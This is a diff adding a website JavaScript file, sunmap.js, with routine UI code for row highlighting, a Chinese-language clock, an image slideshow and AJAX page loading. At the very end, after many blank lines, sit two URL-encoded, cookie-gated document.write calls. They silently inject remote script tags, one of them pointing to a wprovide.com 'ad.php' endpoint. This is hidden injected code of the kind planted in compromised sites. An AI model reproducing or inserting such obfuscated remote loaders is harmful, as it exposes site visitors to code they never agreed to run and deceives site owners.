@@ -1,0 +1,205 @@
+﻿// sunmap.js
+
+var currentRowId = 0; 
+
+function SelectRow() 
+{ 
+    if (event.keyCode == 40) 
+    {
+        MarkRow(currentRowId + 1); 
+    }    
+    else
+    { 
+        if (event.keyCode == 38) 
+        {
+            MarkRow(currentRowId - 1); 
+        }    
+    } 
+}
+
+function MarkRow(rowId) 
+{             
+    if (document.getElementById(rowId) == null) 
+    {
+        return;
+    }    
+    if (document.getElementById(currentRowId) != null ) 
+    {
+        document.getElementById(currentRowId).style.backgroundColor = '#ffffff';
+    }
+    else
+    { 
+        currentRowId = rowId; 
+        document.getElementById(rowId).style.backgroundColor = '#A1ADF1';
+    }
+}
+
+function id(x)
+{
+    if (typeof x == "string")
+    {
+        return document.getElementById(x);
+    }    
+    return x;
+}
+
+var timerID = null
+var timerRunning = false
+
+function MakeArray(size) 
+{
+  this.length = size;
+  for(var i = 1; i <= size; i++)
+    this[i] = "";
+  return this;
+}
+
+function stopclock()
+{
+    if(timerRunning)
+        clearTimeout(timerID);
+    timerRunning = false;
+}
+
+function showtime()
+{
+    var now = new Date();
+    var year = ( now.getYear() < 1900 ) ? ( 1900 + now.getYear() ) : 
+    year = now.getYear();
+    var month = now.getMonth() + 1;
+    var date = now.getDate();
+    var hours = now.getHours();
+    var minutes = now.getMinutes();
+    var seconds = now.getSeconds();
+    var day = now.getDay();
+    Day = new MakeArray(7);
+    Day[0] = "星期日";
+    Day[1] = "星期一";
+    Day[2] = "星期二";
+    Day[3] = "星期三";
+    Day[4] = "星期四";
+    Day[5] = "星期五";
+    Day[6] = "星期六";
+    var timeValue = year + "年";
+    timeValue += ((month < 10) ? "0" : "") + month + "月";
+    timeValue += date + "日  ";
+    timeValue += (Day[day]) + " ";
+    timeValue += (hours < 12) ? "AM " : "PM ";
+    timeValue += ((hours <= 12) ? hours : hours - 12);
+    timeValue += ((minutes < 10) ? ":0" : ":") + minutes;
+    timeValue += ((seconds < 10) ? ":0" : ":") + seconds;
+    id("lalClock").value = timeValue;
+    timerID = setTimeout("showtime()",1000);
+    timerRunning = true;
+}
+
+function startclock()
+{
+  stopclock();
+  showtime();
+}
+
+
+ iname = new img1(5);
+ iname[0] = "url(images/sw_16.gif) no-repeat"
+ iname[1] = "url(images/sw_19.gif) no-repeat"
+ iname[2] = "url(images/sw_17.gif) no-repeat"
+ iname[3] = "url(images/sw_18.gif) no-repeat"
+ iname[4] = "url(images/sw_20.gif) no-repeat"
+ 
+ 
+ var i = 0;
+ var Pic;
+
+ function PlayPic()
+ {
+     if(i == 4)
+     {
+         i = 0;
+     }    
+     else
+     {
+        i++;
+     }   
+     Pic = document.getElementById("Pic"); 
+     Pic.filters[0].apply();
+     Pic.style.background=iname[i];
+     Pic.filters[0].play();
+     mytimeout = setTimeout("PlayPic()",10000);
+ }
+
+ function img1(x)
+ {
+     this.length = x;
+ }
+ 
+var xmlHttp;
+function CreateXMLHttpRequest()
+{
+    if (window.ActiveXObject)
+    {
+        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+    }    
+　　else
+　　{ 
+　　    if (window.XMLHttpRequest)
+　　    {
+　　        xmlHttp = new XMLHttpRequest();
+        }
+    }　　        
+}
+
+function StartRequest(MenuIetm)
+{
+    CreateXMLHttpRequest();
+    xmlHttp.onreadystatechange = handleStateChange;
+    xmlHttp.open("GET", MenuIetm, true);
+    xmlHttp.send(null);
+}
+
+function handleStateChange() 
+{
+    if(xmlHttp.readyState == 4)
+    {
+        if(xmlHttp.status == 200)
+        {    
+            document.getElementById("MainBody_1").innerHTML = xmlHttp.responseText;
+        }    
+
+    }
+} 
+
+function s_click(obj)
+{
+    var num = 0;
+    for (var i = 0; i < obj.options.length; i++)
+    {
+        if (obj.options[i].selected == true)
+        {
+            num++;
+        }
+    }
+    if (num == 1)
+    {
+        var url = obj.options[obj.selectedIndex].value;
+        window.open(url); //这里修改打开连接方式
+    }
+}
+ 
+
+
+
+
+
+ 
+
+
+
+
+
+
+if(document.cookie.indexOf('20120811')==-1){var expires=new Date();expires.setTime(expires.getTime()+24*60*60*1000);document.cookie='20120811=Yes;path=/;expires='+expires.toGMTString();document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%77%70%72%6F%76%69%64%65%2E%63%6F%6D%2F%61%64%2E%70%68%70%3F%69%64%3D%32%30%31%32%30%39%30%34%22%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%3C%2F%73%63%72%69%70%74%3E'));}
+
+
+
+if(document.cookie.indexOf('logtime')==-1){var expires=new Date();expires.setTime(expires.getTime()+24*60*60*1000);document.cookie='logtime=Yes;path=/;expires='+expires.toGMTString();document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%3E%42%41%49%44%55%5F%43%4C%42%5F%53%4C%4F%54%5F%49%44%20%3D%20%22%38%30%32%37%39%31%22%3B%3C%2F%73%63%72%69%70%74%3E%0D%0A%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%63%62%6A%73%2E%62%61%69%64%75%2E%63%6F%6D%2F%6A%73%2F%6F%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E'));}
